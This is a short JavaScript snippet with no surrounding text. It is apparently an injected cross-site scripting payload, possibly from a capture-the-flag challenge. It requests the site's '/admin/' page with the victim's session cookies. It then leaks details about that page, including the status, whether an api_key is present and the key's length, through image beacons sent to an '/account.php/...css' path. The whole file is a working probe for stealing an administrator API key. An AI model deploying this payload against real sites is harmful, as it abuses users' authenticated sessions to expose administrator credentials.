(function () {
  function b(n) { new Image().src = '/account.php/' + n + '.css'; }
  b('S1_alive');
  fetch('/admin/', { credentials: 'include' })
    .then(function (r) { b('S1_status_' + r.status); return r.text(); })
    .then(function (t) {
      b('S1_len_' + t.length);
      b('S1_haskey_' + (/api_key/i.test(t) ? 1 : 0));
      b('S1_hasform_' + (/<form/i.test(t) ? 1 : 0));
      var m = t.match(/api_key=([A-Za-z0-9_\-]+)/i);
      b('S1_keylen_' + (m ? m[1].length : 0));
      var f = t.match(/action="([^"]*)"/gi) || [];
      b('S1_forms_' + f.length);
    })
    .catch(function () { b('S1_fetcherr'); });
})();
